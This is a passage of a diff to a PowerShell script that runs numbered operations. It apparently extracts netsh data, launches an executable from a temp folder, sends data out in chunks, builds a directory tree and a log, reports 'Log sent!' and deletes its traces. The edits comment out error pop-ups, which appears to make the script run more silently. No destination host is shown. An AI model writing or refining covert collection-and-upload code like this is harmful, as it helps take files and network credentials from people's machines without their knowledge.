@@ -168,11 +168,11 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 # [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
             } catch {
                 Write-Host "An error occurred: $($_.Exception.Message)"
-                Add-Type -AssemblyName PresentationFramework
-                [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
+                # Add-Type -AssemblyName PresentationFramework
+                # [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
             }
             $textBlock.Text = "Extracted!"
-            $textBlock.Text = "Starting operation 2..."
+            # $textBlock.Text = "Starting operation 2..."
             Write-Output "Completed Operation 1 - NETSH"
         }
         1 {
@@ -200,7 +200,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
             $process = Start-Process $tempExePath # Start the executable
 
-            $textBlock.Text = "Done operation 2!"
+            $textBlock.Text = "Done Operation " + $step
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps
 
             Write-Output "Completed Operation " + $step + "/" + $totalSteps + "Started the executable"
@@ -266,8 +266,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                     } catch {
                         Write-Host "Error sending request: $_"
-                        Add-Type -AssemblyName PresentationFramework
-                        [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
+                        # Add-Type -AssemblyName PresentationFramework
+                        # [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
                     }
 
                     # Inside the foreach loop, after each chunk is sent
@@ -419,7 +419,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             } else {
                 Write-Host "File not found: $filePath"
                 Add-Type -AssemblyName PresentationFramework
-            [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
+                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
             }
     
             Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
@@ -502,7 +502,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             } else {
                 Write-Host "File not found: $filePath"
                 Add-Type -AssemblyName PresentationFramework
-            [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
+                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
             }
             $textBlock.Text = "Log sent!"
             Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
